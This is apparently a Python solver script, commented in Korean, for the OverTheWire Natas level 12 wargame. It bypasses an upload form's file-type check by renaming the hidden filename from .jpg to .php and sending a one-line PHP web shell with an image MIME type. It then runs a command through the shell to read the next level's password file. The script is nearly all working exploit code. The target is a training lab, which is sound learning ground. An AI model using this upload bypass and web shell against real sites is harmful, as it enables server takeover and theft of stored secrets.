import requests
from bs4 import BeautifulSoup
import os           #os는 웹 셸 파일 만들어서 읽어오게 할꺼면 쓰고 아니면 현재 코드에선 안쓰니 제외시켜도 됨
import io
 
url = "http://natas12.natas.labs.overthewire.org/"
# natas12_cred에는 본인이 이전 단게에서 얻은 natas12 비밀번호 입력할 것 
natas12_cred = ""       

s = requests.Session()
s.auth = ("natas12", natas12_cred)

#요청을 먼저 보내서 현재 페이지를 읽어오게 함.
response = s.get(url)
soup = BeautifulSoup(response.text, "html.parser")

# 해당 파일에선 html의 해당 조건을 가진 줄을 가져와서 value값에 파일 이름이 들어가기 때문에, 변경할려는 값을 변수에 저장 
hidden_input = soup.find('input', {"name":"filename", "type":"hidden"})
orgin_filename = hidden_input['value']

# 히든에 해당하는 파일의 확장자인 jpg를 php로 변경
php_filename = orgin_filename.replace(".jpg",".php")
print(f"[+]hidden값 원래 파일 이름 ==> {orgin_filename}")
print(f"[+]hidden값 변경 후 파일 이름 ==> {php_filename}")

#만들어 놓은 웹셸 파일 얼로드 할려고 했더니 안 열리고 오류나서 아래코드 주석처리함(써도되고 안 써도 됨)

#webshell_file_path = os.path.join(os.path.dirname(__file__), "./shell.php")
#with open(webshell_file_path, "rb") as f: 

#여기서 직접 웹셸 만들어서 utf-8 인코딩 거쳐서 생성해서 적용 
webshell_content = "<?php echo shell_exec($_GET['cmd']);?>" 
webshell_file = io.BytesIO(webshell_content.encode('utf-8'))

#파일을 만들어 shell.php란 이름으로 저장하고 확장자의 mime타입까지 입력하여 요청할 파일 생성
files = {"uploadedfile": ("shell.php", webshell_file, "image/jpeg")}

# 파일명을 바꾸고 업로드까지 하는 요청 실행 
upload_data = { "filename": php_filename, "submit":"Upload File"}
upload_res = s.post(url, data = upload_data, files = files)

#업로드된 파일의 경로를 알아야 웹셸 실행 가능하기 때문에, 아래와 같이 응답에서 찾아서 upload_file_path에 저장  
upload_soup = BeautifulSoup(upload_res.text, "html.parser")
upload_file_path = None

for a_tag in upload_soup.find_all("a", href=True):
  if "upload" in a_tag["href"]:
    upload_file_path = a_tag
    break


# 파일을 업로드하고 웹 셸에서 비밀번호를 찾기위해 아래 명령 페이로드 요청하여 나오는 비밀번호 출력
# -> 여기서 수동으로 해보면 해당 비밀번호만 파일에 저장된 것을 볼 수 있음(strip() 함수는 가독성 용으로 공백제거)
shell_url = ""

if upload_file_path:
  shell_url = url + upload_file_path["href"]
  print(f"[+]웹셸 업로드된 파일 경로 ==> {shell_url}")
  
  payload = {"cmd": "cat /etc/natas_webpass/natas13"}  
  
  shell_payload_res = s.get(shell_url, params=payload)
  
  print("="*60)
  print(f"[+]웹 셸을 통해 비밀번호를 찾았습니다. ===> {shell_payload_res.text.strip()}")  
  print("="*60)
  
else:
  print("[-]웹셸이 업로드 실패하였습니다. 웹셸 업로드를 다시 해주세요")
